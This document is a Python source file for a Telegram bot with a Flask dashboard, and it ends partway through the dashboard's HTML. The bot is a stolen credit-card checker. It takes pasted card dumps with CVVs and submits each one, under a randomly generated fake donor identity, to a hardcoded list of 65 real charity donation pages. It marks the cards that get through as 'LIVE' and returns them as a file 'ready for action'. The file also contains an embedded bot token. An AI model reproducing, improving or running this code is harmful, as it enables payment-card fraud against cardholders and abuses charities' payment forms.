#!/usr/bin/env python3
# ZO BOT ULTIMATE v10.0 - Complete System with Full Status Page
# Created for Alpha in Zeta Realm

import telebot
import requests
import concurrent.futures
import time
import random
import logging
import io
import os
import sys
import threading
import queue
import json
import psutil
import socket
import subprocess
from datetime import datetime, timedelta
from threading import Lock, Thread, Semaphore
from telebot import types
import urllib3
from flask import Flask, render_template_string, jsonify, Response
import schedule
import traceback
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict, deque

# ⚙️ Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ⚙️ Setup logging - تحسين نظام التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot_log.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# 🔧 إعدادات الأداء
MAX_CONCURRENT_CHECKS = 10  # الحد الأقصى للفحوصات المتزامنة
MAX_THREADS = 50  # الحد الأقصى للخيوط
REQUEST_TIMEOUT = 25  # وقت انتظار الطلب
CACHE_DURATION = 300  # مدة التخزين المؤقت (ثواني)

# 🔧 تهيئة Flask للحفاظ على تشغيل البوت
app = Flask(__name__)

TOKEN = '8461335317:AAGQJiLPundrDanUTiW7QrD6hHK_lc11Nyw'
bot = telebot.TeleBot(TOKEN, parse_mode='HTML')

# 🔒 القنوات الإجبارية للاشتراك
REQUIRED_CHANNELS = [
    {'username': 'NATGD', 'link': 'https://t.me/NATGD'},
    {'username': 'aN_TL_1', 'link': 'https://t.me/aN_TL_1'}
]

logger.info(f"✅ Required channels: {[ch['username'] for ch in REQUIRED_CHANNELS]}")

# 🔒 أقفال الذاكرة والتحكم في التزامن
memory_lock = Lock()
rate_limit_semaphore = Semaphore(MAX_CONCURRENT_CHECKS)
thread_pool = ThreadPoolExecutor(max_workers=MAX_THREADS)

# 🌐 COMPLETE GATEWAYS LIST (65 Gateways)
GATEWAYS = [
    "https://ananau.org/donate/donation/",
    "https://suma-ev.de/en/eine-aera-geht-zu-ende/",
    "https://karenhilltribes.org.uk/get-involved/donate/",
    "https://awwatersheds.org/donate/",
    "https://helpusgivesmiles.org/send-a-card/",
    "https://humanium.org/h/fr-en/make-a-donation/",
    "https://gift-of-life.org/make-a-donation/",
    "https://pettet.org.au/fundraiser/",
    "https://scabafoundation.org/causes/",
    "https://muslimfamilyinitiative.org/donations/advocacy-fund/",
    "https://mfrfoundation.org/donate/",
    "https://migrantwomenmalta.org/donations/codvid-19-fundraiser-2/",
    "https://hartlandwintertrails.org/donate/",
    "https://www.ccp-ct.org/donate/",
    "https://lindellclub.org/donations/general/",
    "https://farmersforclimateaction.org.au/donate/",
    "https://lightwithoutborders.org.es/make-a-donation/",
    "https://hopelives365biblestudy.com/donate/",
    "https://abundantearthfoundation.org/donations/ancientcacao/",
    "https://mullmonastery.com/donate/",
    "https://azadinc.org/donate",
    "https://lssvi.org/donations/kayak-2019/",
    "https://onebeat.org.uk/donate/",
    "https://www.takingflighttheatre.org.uk/support-us/",
    "https://www.jetsschool.org/donate/",
    "https://ashevillecreativearts.org/get-involved/donate-to-our-partner-organizations/donate-to-cine-casual/",
    "https://alabamatheatre.com/project/cash-donation/",
    "https://sopercussion.com/donate/",
    "https://www.childrenpaychildren.com/?give_forms=make-a-donation&lang=zh",
    "https://sanctuaryfederation.org/donate-to-gfas/",
    "https://rewilding-apennines.com/make-a-donation/",
    "https://tmtrd.org/donate/",
    "https://petalumawetlands.org/donate-to-pwa/",
    "https://www.chautauquaopportunities.com/donation-form/",
    "https://freeyezidi.org/donations/donate-to-us/",
    "https://www.buckscountysymphony.org/support/donate/",
    "https://www.elephantconservationcenter.com/elephant/mae-boua-phan/",
    "https://www.nnlegalaid.org/donate/",
    "https://biographersinternational.org/donate/",
    "https://rippleafrica.org/donations/donate-quarterly/",
    "https://humboldteducationfoundation.org/donate/",
    "https://walsinghamassociation.org.uk/walsingham-association-membership-renewals/",
    "https://backsidelearningcenter.org/blc20years/",
    "https://goquickly.org/donate/",
    "https://ntachc.org/donate-coronavirus/",
    "https://www.besanthill.org/giving/online-giving/",
    "https://ipconfederation.org/donate/",
    "https://binnaclehouse.org/donation/",
    "https://vfwpost3617.org/donate/",
    "https://www.coretraining.com.co/donate-silver/",
    "https://news-decoder.com/donate/",
    "https://audreyclement.com/donations/donate-to-campaign/",
    "https://tiwlt.ca/support/",
    "https://www.capal.org/site/donateform/",
    "https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/",
    "https://chicagotherapycollective.org/donate-now/",
    "https://lpfcc.org/donate/",
    "https://agbfd.org/donate/",
    "https://umifeeds.org/donations/donate/",
    "https://www.bannerneighborhoods.org/donate/",
    "https://reinventalbany.org/donate/",
    "https://www.olmec-ec.org.uk/donate/",
    "https://childrensaid.co.uk/fidyah-kaffarah/",
    "https://www.nhledges.org/donate/",
    "https://www.foretiafoundation.org/donations/join-our-work-donate-today/"
]

logger.info(f"✅ Loaded {len(GATEWAYS)} gateways")

# 💾 Memory storage مع تحسين الأداء
user_dumps = {}
user_sessions = {}
user_live_cards = {}
user_check_processes = {}
user_selected_gateways = {}
gateway_cache = {}  # تخزين مؤقت للبوابات
system_metrics = {
    'total_requests': 0,
    'successful_checks': 0,
    'failed_checks': 0,
    'gateway_usage': defaultdict(int),
    'hourly_stats': deque(maxlen=24),
    'start_time': datetime.now()
}

# 🎯 نظام إدارة الطلبات
class RequestManager:
    def __init__(self):
        self.request_queue = queue.Queue()
        self.active_requests = 0
        self.max_concurrent = MAX_CONCURRENT_CHECKS
        self.lock = Lock()
        
    def add_request(self, func, *args, **kwargs):
        """إضافة طلب إلى قائمة الانتظار"""
        self.request_queue.put((func, args, kwargs))
        self.process_queue()
        
    def process_queue(self):
        """معالجة الطلبات في قائمة الانتظار"""
        with self.lock:
            while self.active_requests < self.max_concurrent and not self.request_queue.empty():
                func, args, kwargs = self.request_queue.get()
                self.active_requests += 1
                thread_pool.submit(self._execute_request, func, args, kwargs)
                
    def _execute_request(self, func, args, kwargs):
        """تنفيذ الطلب"""
        try:
            func(*args, **kwargs)
        finally:
            with self.lock:
                self.active_requests -= 1
            self.process_queue()

request_manager = RequestManager()

# ============================================
# 📊 نظام مراقبة متكامل
# ============================================

class SystemMonitor:
    def __init__(self):
        self.start_time = datetime.now()
        self.metrics = {
            'cpu_usage': [],
            'memory_usage': [],
            'network_io': {'sent': 0, 'received': 0},
            'disk_io': {'read': 0, 'write': 0}
        }
        
    def get_system_info(self):
        """الحصول على معلومات النظام"""
        try:
            # معلومات النظام الأساسية
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            # معلومات الشبكة
            net_io = psutil.net_io_counters()
            
            # معلومات العمليات
            process = psutil.Process(os.getpid())
            
            return {
                'cpu_percent': cpu_percent,
                'memory_percent': memory.percent,
                'memory_used_gb': memory.used / (1024**3),
                'memory_total_gb': memory.total / (1024**3),
                'disk_percent': disk.percent,
                'disk_used_gb': disk.used / (1024**3),
                'disk_total_gb': disk.total / (1024**3),
                'network_sent_mb': net_io.bytes_sent / (1024**2),
                'network_recv_mb': net_io.bytes_recv / (1024**2),
                'process_memory_mb': process.memory_info().rss / (1024**2),
                'process_threads': process.num_threads(),
                'process_cpu': process.cpu_percent(interval=0.1)
            }
        except Exception as e:
            logger.error(f"Error getting system info: {e}")
            return None
    
    def get_uptime(self):
        """الحصول على مدة التشغيل"""
        uptime = datetime.now() - self.start_time
        days = uptime.days
        hours, remainder = divmod(uptime.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)
        return {
            'days': days,
            'hours': hours,
            'minutes': minutes,
            'seconds': seconds,
            'formatted': f"{days}d {hours}h {minutes}m {seconds}s"
        }
    
    def get_bot_metrics(self):
        """الحصول على مقاييس البوت"""
        with memory_lock:
            active_checks = len([s for s in user_sessions.values() if s.get('is_checking', False)])
            total_users = len(user_sessions)
            total_cards = sum(len(dumps) for dumps in user_dumps.values())
            total_live = sum(len(cards) for cards in user_live_cards.values())
            
            # تحليل استخدام البوابات
            gateway_stats = {}
            for session in user_sessions.values():
                if 'selected_gateways' in session:
                    for gw in session['selected_gateways']:
                        gateway_stats[gw] = gateway_stats.get(gw, 0) + 1
            
            return {
                'active_checks': active_checks,
                'total_users': total_users,
                'total_cards': total_cards,
                'total_live_cards': total_live,
                'gateway_stats': gateway_stats,
                'cache_size': len(gateway_cache),
                'queue_size': request_manager.request_queue.qsize(),
                'active_requests': request_manager.active_requests,
                'thread_count': threading.active_count()
            }

system_monitor = SystemMonitor()

# ============================================
# 🔍 دوال المساعدة
# ============================================

def safe_request(url, data=None, headers=None, timeout=REQUEST_TIMEOUT, retries=3):
    """طلب آمن مع إعادة المحاولة"""
    for attempt in range(retries):
        try:
            response = requests.post(
                url,
                data=data,
                headers=headers,
                timeout=timeout,
                verify=False,
                allow_redirects=True,
                proxies=None
            )
            return response
        except requests.exceptions.Timeout:
            logger.warning(f"Timeout attempt {attempt + 1} for {url}")
            if attempt < retries - 1:
                time.sleep(random.uniform(1, 3))
            continue
        except requests.exceptions.ConnectionError:
            logger.warning(f"Connection error attempt {attempt + 1} for {url}")
            if attempt < retries - 1:
                time.sleep(random.uniform(2, 5))
            continue
        except Exception as e:
            logger.error(f"Request error: {e}")
            if attempt < retries - 1:
                time.sleep(random.uniform(1, 3))
            continue
    return None

def check_subscription(user_id):
    """فحص اشتراك المستخدم"""
    not_subscribed = []
    
    for channel in REQUIRED_CHANNELS:
        username = channel['username']
        try:
            chat_member = bot.get_chat_member(f"@{username}", user_id)
            if chat_member.status not in ['member', 'administrator', 'creator']:
                not_subscribed.append(channel)
        except Exception as e:
            logger.warning(f"Subscription check warning for @{username}: {e}")
            not_subscribed.append(channel)
    
    return not_subscribed

def create_subscription_markup():
    """إنشاء أزرار الاشتراك"""
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    for channel in REQUIRED_CHANNELS:
        markup.add(types.InlineKeyboardButton(
            f"📢 انضم @{channel['username']}",
            url=channel['link']
        ))
    
    markup.add(types.InlineKeyboardButton(
        "✅ تحقق من الاشتراك",
        callback_data="check_subscription"
    ))
    
    return markup

def generate_fake_donor():
    """إنشاء متبرع وهمي"""
    first_names = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda"]
    last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis"]
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    return {
        'first_name': first,
        'last_name': last,
        'email': f"{first.lower()}.{last.lower()}{random.randint(100,999)}@gmail.com",
        'phone': f"+1{random.randint(200,999)}{random.randint(1000000,9999999)}",
        'address': f"{random.randint(100,999)} Main Street",
        'city': random.choice(["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]),
        'state': random.choice(["NY", "CA", "IL", "TX", "AZ"]),
        'zip': f"{random.randint(10000,99999)}",
        'country': "US",
        'amount': str(random.choice([5, 10, 15, 20, 25, 50])),
        'currency': "USD"
    }

def create_progress_bar(percentage, width=20):
    """إنشاء شريط التقدم"""
    filled = int(width * percentage / 100)
    empty = width - filled
    bar = "█" * filled + "░" * empty
    return f"[{bar}] {percentage}%"

def create_check_buttons():
    """إنشاء أزرار الفحص"""
    markup = types.InlineKeyboardMarkup(row_width=3)
    
    btn_start = types.InlineKeyboardButton("🚀 Start Check", callback_data="start_check")
    btn_stop = types.InlineKeyboardButton("🛑 Stop Check", callback_data="stop_check")
    btn_stats = types.InlineKeyboardButton("📊 Stats", callback_data="show_stats")
    btn_live = types.InlineKeyboardButton("✅ Live Cards", callback_data="show_live")
    btn_save = types.InlineKeyboardButton("💾 Save Results", callback_data="save_results")
    btn_new = types.InlineKeyboardButton("🆕 New Check", callback_data="new_check")
    
    markup.add(btn_start, btn_stop)
    markup.add(btn_stats, btn_live)
    markup.add(btn_save, btn_new)
    
    return markup

def create_main_menu():
    """إنشاء القائمة الرئيسية"""
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    btn_check = types.KeyboardButton("🔍 Check Cards")
    btn_quick = types.KeyboardButton("⚡ Quick Check")
    btn_stats = types.KeyboardButton("📊 Statistics")
    btn_gateways = types.KeyboardButton("🌐 Gateways")
    btn_help = types.KeyboardButton("❓ Help")
    btn_clear = types.KeyboardButton("🧹 Clear")
    
    markup.add(btn_check, btn_quick)
    markup.add(btn_stats, btn_gateways)
    markup.add(btn_help, btn_clear)
    
    return markup

def parse_dumps_from_text(text, user_id):
    """تحليل الكروت من النص"""
    dumps = []
    lines = text.strip().split('\n')
    
    for line in lines:
        line = line.strip()
        if line and not line.startswith('#'):
            line = '|'.join([part.strip() for part in line.split('|')])
            
            if '|' in line:
                parts = line.split('|')
                if len(parts) >= 3:
                    card = parts[0].replace(" ", "")
                    
                    if len(parts) == 3:
                        expiry = parts[1]
                        cvv = parts[2]
                        
                        if len(expiry) == 4 and expiry.isdigit():
                            mm = expiry[:2]
                            yy = expiry[2:]
                            if len(yy) == 2:
                                yy = "20" + yy
                            if mm.isdigit() and int(mm) in range(1, 13) and cvv.isdigit():
                                dumps.append(f"{card}|{mm}|{yy}|{cvv}")
                    
                    elif len(parts) == 4:
                        card = parts[0].replace(" ", "")
                        mm = parts[1].zfill(2)
                        yy = parts[2]
                        cvv = parts[3]
                        
                        if len(yy) == 2:
                            yy = "20" + yy
                        
                        if (card.isdigit() and len(card) in [15, 16] and
                            mm.isdigit() and int(mm) in range(1, 13) and
                            yy.isdigit() and len(yy) == 4 and
                            cvv.isdigit() and len(cvv) in [3, 4]):
                            dumps.append(f"{card}|{mm}|{yy}|{cvv}")
    
    with memory_lock:
        user_dumps[user_id] = dumps
        user_sessions[user_id] = {
            'total_cards': len(dumps),
            'checked': 0,
            'live': 0,
            'declined': 0,
            'unknown': 0,
            'start_time': datetime.now(),
            'is_checking': False,
            'stop_requested': False,
            'gateways_used': []
        }
        user_live_cards[user_id] = []
    
    logger.info(f"📥 Loaded {len(dumps)} dumps for user {user_id}")
    return dumps

def check_single_dump(dump, gateway_url):
    """فحص كارت واحد"""
    parts = dump.split('|')
    if len(parts) < 4:
        return "invalid", {"emoji": "❓", "status": "INVALID", "message": "Wrong format"}
    
    card = parts[0]
    mm = parts[1]
    yy = parts[2][-2:]
    cvv = parts[3]
    
    donor = generate_fake_donor()
    gateway_domain = gateway_url.split('//')[1].split('/')[0]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': gateway_url,
        'Origin': gateway_url.split('/')[0] + '//' + gateway_url.split('//')[1].split('/')[0]
    }
    
    payload = {
        'card_number': card,
        'expiry_month': mm,
        'expiry_year': yy,
        'cvv': cvv,
        'cardholder_name': f"{donor['first_name']} {donor['last_name']}",
        'amount': donor['amount'],
        'currency': donor['currency'],
        'email': donor['email'],
        'phone': donor['phone'],
        'address': donor['address'],
        'city': donor['city'],
        'state': donor['state'],
        'zip_code': donor['zip'],
        'country': donor['country']
    }
    
    try:
        response = requests.post(
            gateway_url,
            data=payload,
            headers=headers,
            timeout=20,
            verify=False,
            allow_redirects=True
        )
        
        response_text = response.text.lower()
        status_code = response.status_code
        
        result_info = {
            "emoji": "⚠️",
            "status": "UNKNOWN",
            "gateway": gateway_domain[:20],
            "code": status_code,
            "full_dump": dump
        }
        
        success_keywords = ['success', 'thank you', 'thank', 'approved', 'confirmation', 'processed', 'payment successful']
        decline_keywords = ['declined', 'failed', 'invalid', 'error', 'not authorized', 'rejected', 'try again']
        fraud_keywords = ['fraud', 'suspicious', 'security', 'verification required']
        funds_keywords = ['insufficient', 'funds', 'balance', 'limit exceeded']
        
        # Check for specific responses
        if any(word in response_text for word in success_keywords):
            result_info.update({"emoji": "✅", "status": "LIVE"})
            return "live", result_info
        
        elif any(word in response_text for word in funds_keywords):
            result_info.update({"emoji": "💰", "status": "INSUFFICIENT FUNDS"})
            return "funds", result_info
        
        elif any(word in response_text for word in decline_keywords):
            result_info.update({"emoji": "💬", "status": "DECLINED"})
            return "declined", result_info
        
        elif any(word in response_text for word in fraud_keywords):
            result_info.update({"emoji": "🚫", "status": "FRAUD ALERT"})
            return "fraud", result_info
        
        elif status_code == 200:
            result_info.update({"emoji": "⚠️", "status": "UNKNOWN RESPONSE"})
            return "unknown", result_info
        
        else:
            result_info.update({"emoji": "🔧", "status": f"HTTP {status_code}"})
            return f"http_{status_code}", result_info
            
    except requests.exceptions.Timeout:
        return "timeout", {"emoji": "⏰", "status": "TIMEOUT", "gateway": gateway_domain[:20]}
    except requests.exceptions.ConnectionError:
        return "connection", {"emoji": "🔌", "status": "CONNECTION ERROR", "gateway": gateway_domain[:20]}
    except Exception as e:
        return "error", {"emoji": "❌", "status": f"ERROR: {str(e)[:30]}", "gateway": gateway_domain[:20]}

def send_live_cards_auto(user_id, chat_id, live_cards, username=""):
    """إرسال الكروت الناجحة تلقائياً"""
    if not live_cards:
        return
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Create file content
    file_content = f"""# 🔥 LIVE CARDS - ZO BOT ULTIMATE
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
# User: {username if username else user_id}
# Total Live Cards: {len(live_cards)}
# Format: CARD|MM|YYYY|CVV
# 
# =========== LIVE CARDS ===========

"""
    
    for dump in live_cards:
        file_content += f"{dump}\n"
    
    file_content += "\n# =========== END ==========="
    
    # Send as document
    try:
        bot.send_document(
            chat_id,
            document=io.BytesIO(file_content.encode('utf-8')),
            visible_file_name=f"LIVE_CARDS_{timestamp}.txt",
            caption=f"""
<b>💎 LIVE CARDS FOUND!</b>

<b>✅ Total Live:</b> {len(live_cards)}
<b>📅 Date:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
<b>👤 User:</b> {username if username else 'Anonymous'}

<b>🔥 {len(live_cards)} cards ready for action!</b>

<code>File saved as: LIVE_CARDS_{timestamp}.txt</code>
""",
            parse_mode='HTML',
            reply_markup=create_check_buttons()
        )
        return True
    except Exception as e:
        logger.error(f"Failed to send file: {e}")
        
        # Try sending as text if file fails
        if len(live_cards) <= 15:
            try:
                live_text = f"<b>💎 LIVE CARDS ({len(live_cards)}):</b>\n\n"
                for i, dump in enumerate(live_cards, 1):
                    card = dump.split('|')[0]
                    mm = dump.split('|')[1]
                    yy = dump.split('|')[2][-2:]
                    cvv = dump.split('|')[3]
                    live_text += f"{i}. <code>{card[:6]}...{card[-4:]} | {mm}/{yy} | {cvv}</code>\n"
                
                bot.send_message(chat_id, live_text, parse_mode='HTML')
                return True
            except:
                pass
        
        return False

def run_check_process(user_id, chat_id, message_id):
    """عملية الفحص الرئيسية"""
    with memory_lock:
        if user_id not in user_dumps or not user_dumps[user_id]:
            logger.error(f"No dumps for user {user_id}")
            return
        
        dumps = user_dumps[user_id].copy()
        session = user_sessions[user_id]
        session['is_checking'] = True
        session['stop_requested'] = False
        session['start_time'] = datetime.now()
        session['checked'] = 0
        session['live'] = 0
        session['declined'] = 0
        session['unknown'] = 0
        
        user_live_cards[user_id] = []
        user_check_processes[user_id] = True
    
    total_cards = len(dumps)
    checked = 0
    live_count = 0
    declined_count = 0
    funds_count = 0
    live_cards_list = []
    
    # Select random gateways
    selected_gateways = random.sample(GATEWAYS, min(15, len(GATEWAYS)))
    
    # Initial message
    initial_message = f"""
<b>🔍 Please Wait Checking Your Cards</b>

<b>Cards :</b> {total_cards}
<b>Gateways :</b> {len(selected_gateways)}
<b>Status:</b> 🚀 Starting...
<b>Progress:</b> 0/{total_cards}

<b>Dev:</b> @NAPGF
"""
    
    try:
        bot.edit_message_text(
            initial_message,
            chat_id=chat_id,
            message_id=message_id,
            reply_markup=create_check_buttons(),
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Failed to edit message: {e}")
    
    # Check each dump
    for i, dump in enumerate(dumps):
        with memory_lock:
            if session.get('stop_requested', False):
                logger.info(f"Check stopped by user {user_id}")
                break
        
        checked += 1
        card_num = dump.split('|')[0]
        
        # Select random gateway for this dump
        gateway = random.choice(selected_gateways)
        result_type, result_info = check_single_dump(dump, gateway)
        
        # Update statistics
        if result_type == "live":
            live_count += 1
            live_cards_list.append(dump)
            with memory_lock:
                if user_id in user_live_cards:
                    user_live_cards[user_id].append(dump)
        elif result_type == "declined":
            declined_count += 1
        elif result_type == "funds":
            funds_count += 1
        
        # Update session
        with memory_lock:
            if user_id in user_sessions:
                user_sessions[user_id]['checked'] = checked
                user_sessions[user_id]['live'] = live_count
                user_sessions[user_id]['declined'] = declined_count
        
        # Update message every 5 cards or on live hit
        if checked % 5 == 0 or result_type == "live" or checked == total_cards:
            percentage = int((checked / total_cards) * 100)
            progress_bar = create_progress_bar(percentage)
            
            current_card_display = f"<code>{card_num[:6]}...{card_num[-4:]} | {dump.split('|')[1]}/{dump.split('|')[2][-2:]} | {dump.split('|')[3]}</code>"
            
            update_message = f"""
<b>🔍 Please Wait Checking Your Cards</b>

<b>Cards :</b> {total_cards}
<b>Current Card:</b> {current_card_display}
<b>Status:</b> {result_info['emoji']} {result_info['status']}

<b>Progress:</b> {checked}/{total_cards}
{progress_bar}

<b>✅ Live:</b> {live_count} | <b>💬 Declined:</b> {declined_count} | <b>💰 Funds:</b> {funds_count}

<b>Dev:</b> @NAPGF
"""
            
            try:
                bot.edit_message_text(
                    update_message,
                    chat_id=chat_id,
                    message_id=message_id,
                    reply_markup=create_check_buttons(),
                    parse_mode='HTML'
                )
            except:
                pass
        
        # Random delay between checks
        time.sleep(random.uniform(0.5, 2.0))
    
    # Final message
    duration = (datetime.now() - session['start_time']).total_seconds()
    success_rate = (live_count / total_cards * 100) if total_cards > 0 else 0
    
    final_message = f"""
<b>🎯 Check Complete!</b>

<b>📊 Final Results:</b>
<b>Total Cards:</b> {total_cards}
<b>✅ Live Cards:</b> {live_count}
<b>💰 With Funds:</b> {funds_count}
<b>💬 Declined:</b> {declined_count}
<b>⚠️ Other:</b> {total_cards - live_count - declined_count - funds_count}

<b>⏱️ Duration:</b> {duration:.1f}s
<b>🎯 Success Rate:</b> {success_rate:.1f}%

<b>🔥 {live_count} cards ready for action!</b>

<b>📤 Sending live cards automatically...</b>

<b>Dev:</b> @NAPGF
"""
    
    try:
        bot.edit_message_text(
            final_message,
            chat_id=chat_id,
            message_id=message_id,
            reply_markup=create_check_buttons(),
            parse_mode='HTML'
        )
    except:
        pass
    
    # 🔥 Auto-send live cards
    if live_cards_list:
        username = ""
        with memory_lock:
            if user_id in user_sessions:
                username = user_sessions[user_id].get('username', '')
        
        send_live_cards_auto(user_id, chat_id, live_cards_list, username)
    
    with memory_lock:
        if user_id in user_sessions:
            user_sessions[user_id]['is_checking'] = False
        if user_id in user_check_processes:
            del user_check_processes[user_id]

# ============================================
# 🌐 صفحات Flask المتكاملة
# ============================================

def get_system_stats():
    """الحصول على إحصائيات النظام"""
    bot_metrics = system_monitor.get_bot_metrics()
    system_info = system_monitor.get_system_info()
    uptime = system_monitor.get_uptime()
    
    return {
        'bot': bot_metrics,
        'system': system_info,
        'uptime': uptime,
        'timestamp': datetime.now().isoformat(),
        'gateways_total': len(GATEWAYS),
        'required_channels': REQUIRED_CHANNELS
    }

def get_recent_logs(num_lines=50):
    """الحصول على السجلات الحديثة"""
    try:
        with open('bot_log.log', 'r', encoding='utf-8') as f:
            lines = f.readlines()
        return ''.join(lines[-num_lines:])
    except:
        return "No log file found"

@app.route('/')
def home():
    """الصفحة الرئيسية"""
    stats = get_system_stats()
    
    html_template = '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🚀 ZO BOT ULTIMATE - لوحة التحكم</title>
        <style>
            :root {
                --primary: #4361ee;
                --secondary: #3f37c9;
                --success: #4cc9f0;
                --danger: #f72585;
                --warning: #f8961e;
                --dark: #1a1a2e;
                --light: #f8f9fa;
            }
            
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
            
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: var(--light);
                min-height: 100vh;
                padding: 20px;
            }
            
            .container {
                max-width: 1200px;
                margin: 0 auto;
            }
            
            .header {
                text-align: center;
                padding: 30px 0;
                background: rgba(0, 0, 0, 0.3);
                border-radius: 15px;
                margin-bottom: 30px;
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.1);
            }
            
            .header h1 {
                font-size: 2.8rem;
                margin-bottom: 10px;
                background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
            }
            
            .status-badge {
                display: inline-block;
                padding: 8px 20px;
                background: linear-gradient(45deg, #00b09b, #96c93d);
                border-radius: 25px;
                font-weight: bold;
                margin-top: 10px;
                animation: pulse 2s infinite;
            }
            
            @keyframes pulse {
                0% { opacity: 1; }
                50% { opacity: 0.7; }
                100% { opacity: 1; }
            }
            
            .cards-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            
            .card {
                background: rgba(255, 255, 255, 0.1);
                backdrop-filter: blur(10px);
                border-radius: 15px;
                padding: 25px;
                border: 1px solid rgba(255, 255, 255, 0.1);
                transition: transform 0.3s, box-shadow 0.3s;
            }
            
            .card:hover {
                transform: translateY(-5px);
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            }
            
            .card-title {
                font-size: 1.2rem;
                margin-bottom: 15px;
                color: var(--success);
                display: flex;
                align-items: center;
                gap: 10px;
            }
            
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
            }
            
            .stat-item {
                background: rgba(0, 0, 0, 0.2);
                padding: 15px;
                border-radius: 10px;
                text-align: center;
            }
            
            .stat-value {
                font-size: 1.8rem;
                font-weight: bold;
                color: var(--warning);
                margin: 5px 0;
            }
            
            .stat-label {
                font-size: 0.9rem;
                opacity: 0.8;
            }
            
            .progress-bar {
                height: 8px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 4px;
                margin: 10px 0;
                overflow: hidden;
            }
            
            .progress-fill {
                height: 100%;
                background: linear-gradient(90deg, #00b09b, #96c93d);
                border-radius: 4px;
                transition: width 0.5s;
            }
            
            .buttons-container {
                display: flex;
                gap: 15px;
                flex-wrap: wrap;
                margin-top: 30px;
            }
            
            .btn {
                padding: 12px 25px;
                border: none;
                border-radius: 8px;
                font-weight: bold;
                cursor: pointer;
                transition: all 0.3s;
                text-decoration: none;
                display: inline-flex;
                align-items: center;
                gap: 8px;
            }
            
            .btn-primary {
                background: linear-gradient(45deg, var(--primary), var(--secondary));
                color: white;
            }
            
            .btn-success {
                background: linear-gradient(45deg, #00b09b, #96c93d);
                color: white;
            }
            
            .btn-warning {
                background: linear-gradient(45deg, #ff9a00, #ff5e00);
                color: white;
            }
            
            .btn:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            }
            
            .log-container {
                background: rgba(0, 0, 0, 0.3);
                border-radius: 10px;
                padding: 20px;
                margin-top: 30px;
                max-height: 400px;
                overflow-y: auto;
                font-family: 'Courier New', monospace;
                font-size: 0.9rem;
            }
            
            .log-line {
                padding: 5px 0;
                border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            }
            
            .timestamp {
                color: var(--success);
            }
            
            .level-info { color: #4cc9f0; }
            .level-warning { color: #f8961e; }
            .level-error { color: #f72585; }
            
            .footer {
                text-align: center;
                margin-top: 40px;
                padding: 20px;
                opacity: 0.8;
                font-size: 0.9rem;
            }
            
            @media (max-width: 768px) {
                .cards-grid {
                    grid-template-columns: 1fr;
                }
                
                .stats-grid {
                    grid-template-columns: 1fr;
                }
                
                .buttons-container {
                    flex-direction: column;
                }
                
                .header h1 {
                    font-size: 2rem;
                }
            }
        </style>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1><i class="fas fa-robot"></i> ZO BOT ULTIMATE v10.0</h1>
                <p>نظام فحص البطاقات عالي الأداء مع مراقبة كاملة للنظام</p>
                <div class="status-badge">
                    <i class="fas fa-circle"></i> النظام يعمل بشكل طبيعي
                </div>
            </div>
            
            <div class="cards-grid">
                <div class="card">
                    <div class="card-title">
                        <i class="fas fa-microchip"></i> حالة النظام
                    </div>
                    <div class="stats-grid">
                        <div class="stat-item">
                            <div class="stat-label">وقت التشغيل</div>
                            <div class="stat-value">{{ uptime.formatted }}</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label">ذاكرة النظام</div>
                            <div class="stat-value">{{ "%.1f"|format(system.memory_percent) }}%</div>
                            <div class="progress-bar">
                                <div class="progress-fill" style="width: {{ system.memory_percent }}%"></div>
                            </div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label">وحدة المعالجة</div>
                            <div class="stat-value">{{ "%.1f"|format(system.cpu_percent) }}%</div>
                            <div class="progress-bar">
                                <div class="progress-fill" style="width: {{ system.cpu_percent }}%"></div>
                            </div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-label">قرص التخزين</div>
                            <div class="stat-value">{{ "%.1f"|format(system.disk_percent) }}%</div>
                            <div class="progress-bar">
                                <div class="progress-fill" style="width: {{ system.disk_percent }}%"></div>
                            </div>
                        </div>
                    </div>
                </div>
